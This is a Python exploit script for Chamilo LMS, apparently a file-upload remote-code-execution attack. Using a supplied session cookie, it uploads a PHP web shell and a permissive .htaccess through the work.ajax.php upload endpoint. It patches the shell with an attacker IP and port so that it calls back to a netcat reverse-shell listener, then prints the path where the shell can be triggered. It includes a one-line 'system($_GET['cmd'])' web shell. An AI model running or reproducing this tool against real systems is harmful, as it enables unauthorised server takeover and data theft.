#!/usr/bin/python

import requests
import sys
import os
import time
import re
from colorama import init, Fore, Style

init(autoreset=True)

MARKERS = {
    "info": f"{Fore.BLUE}{Style.BRIGHT}[*]{Style.RESET_ALL}",
    "action": f"{Fore.CYAN}{Style.BRIGHT}[>]{Style.RESET_ALL}",
    "success": f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL}",
    "error": f"{Fore.RED}{Style.BRIGHT}[-]{Style.RESET_ALL}",
    "cancel": f"{Fore.YELLOW}{Style.BRIGHT}[x]{Style.RESET_ALL}"
}

def info(message):
    return f"{MARKERS['info']} {message}"

def action(message):
    return f"{MARKERS['action']} {message}"

def success(message):
    return f"{MARKERS['success']} {message}"

def error(message):
    return f"{MARKERS['error']} {message}"

def cancel(message):
    return f"{MARKERS['cancel']} {message}"

def create_htaccess():
    content = """php_flag engine on
AcceptPathInfo on
<FilesMatch ".+">
    order allow,deny
    allow from all
</FilesMatch>"""
    htaccess_path = ".htaccess"
    if os.path.exists(htaccess_path):
        with open(htaccess_path, "r") as f:
            if f.read().strip() == content.strip():
                return
    with open(htaccess_path, "w") as f:
        f.write(content)
    print(success(".htaccess created"))

def check_requirements():
    files = ["rce.php"]
    missing = [f for f in files if not os.path.exists(f)]
    if missing:
        print(error(f"Missing file: {missing[0]}"))
        print(f"  {error('Create: echo \"<?php system($_GET[\'cmd\']); ?>\" > rce.php')}")
        sys.exit(1)
    create_htaccess()
    print(success("rce.php, .htaccess ready"))
    return ["rce.php", ".htaccess"]

def validate_ip(ip):
    pattern = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return bool(re.match(pattern, ip))

def validate_port(port):
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

def modify_rce_php(ip, port):
    rce_path = "rce.php"
    try:
        with open(rce_path, "r") as f:
            content = f.read()
        original_content = content
        # Reemplazar $ip y $port (en minúsculas)
        content = re.sub(r'\$ip\s*=\s*[\'"].*?[\'"]\s*;', f'$ip = "{ip}";', content)
        content = re.sub(r'\$port\s*=\s*\d+\s*;', f'$port = {port};', content)
        if content != original_content:
            with open(rce_path, "w") as f:
                f.write(content)
            print(success("rce.php updated with IP and Port"))
        else:
            print(error("No $ip or $port found in rce.php"))
    except IOError as e:
        print(f"  {error(f'Failed to modify rce.php: {e}')}")
        sys.exit(1)

def get_user_input():
    print(f"\n{info('CREDENTIALS')}")
    print(info("Cookies via F12→Cookies"))
    
    try:
        base_url = input(info("URL (e.g., http://chamilo.com): ")).strip()
        if not base_url:
            print(f"  {error('Missing: URL')}")
            sys.exit(1)
        if not base_url.startswith(("http://", "https://")):
            print(f"  {error('Invalid: Use http:// or https://')}")
            sys.exit(1)
        
        ch_sid = input(info("Session Cookie (ch_sid): ")).strip()
        if not ch_sid:
            print(f"  {error('Missing: ch_sid')}")
            sys.exit(1)
        
        default_view = input(info("View Cookie (defaultMyCourseView3, Enter for 0): ")).strip() or "0"
        
        print(info("Listener: Enter IP for remote shell (e.g., your machine's IP)"))
        ip = input(info("IP: ")).strip()
        if not validate_ip(ip):
            print(f"  {error('Invalid: IP format (e.g., 192.168.1.100)')}")
            sys.exit(1)
        
        print(info("Listener: Enter port for nc listener (e.g., nc -lvnp 4444)"))
        port = input(info("Port: ")).strip()
        if not validate_port(port):
            print(f"  {error('Invalid: Port (1-65535)')}")
            sys.exit(1)
    
    except KeyboardInterrupt:
        print(f"\n{cancel('Halted')}")
        sys.exit(1)
    
    return base_url, {"ch_sid": ch_sid, "defaultMyCourseView3": default_view}, ip, port

def make_get_request(url, cookies):
    for i in [1, 2, 1]:
        print(f"{action('GET... ' + '>' * i)}", end="\r")
        time.sleep(0.02)
    print(" " * 20, end="\r")
    try:
        response = requests.get(url, cookies=cookies, timeout=10)
        if response.status_code == 200:
            print(success(f"GET: {url}"))
        else:
            print(f"  {error(f'Failed: Code {response.status_code}')}")
        return response
    except requests.RequestException as e:
        print(f"  {error(f'Failed: {e}')}")
        return None

def make_post_request(url, cookies, files):
    for i in [1, 2, 1]:
        print(f"{action('POST... ' + '>' * i)}", end="\r")
        time.sleep(0.02)
    print(" " * 20, end="\r")
    try:
        with open(files[0], "rb") as f1, open(files[1], "rb") as f2:
            file_data = {
                "files[0]": (files[0], f1),
                "files[1]": (files[1], f2)
            }
            response = requests.post(url, cookies=cookies, files=file_data, timeout=10)
            if response.status_code == 200:
                print(success(f"POST: {url}"))
            else:
                print(f"  {error(f'Failed: Code {response.status_code}')}")
        return response
    except requests.RequestException as e:
        print(f"  {error(f'Failed: {e}')}")
        return None
    except IOError as e:
        print(f"  {error(f'Failed: {e}')}")
        return None

def main():
    print(f"\n{info('FILE CHECK')}")
    files = check_requirements()
    
    try:
        base_url, cookies, ip, port = get_user_input()
        modify_rce_php(ip, port)
        
        print(f"\n{info('ATTACK')}")
        get_url = f"{base_url}/main/work/work.php?cidReq=HW"
        get_response = make_get_request(get_url, cookies)
        if get_response is None:
            print(f"  {error('Failed: GET error')}")
            sys.exit(1)
        
        post_url = f"{base_url}/main/inc/ajax/work.ajax.php?a=upload_file&chunkAction=send"
        post_response = make_post_request(post_url, cookies, files)
        if post_response is None:
            print(f"  {error('Failed: POST error')}")
            sys.exit(1)
        
        print(f"\n{info('NEON REPORT')}")
        print(success(f"Payload: rce.php, .htaccess"))
        print(success(f"Target: {base_url}"))
        print(success(f"Action: {base_url}/app/cache/rce.php"))
    
    except KeyboardInterrupt:
        print(f"\n{cancel('Halted')}")
        sys.exit(1)

if __name__ == "__main__":
    main()
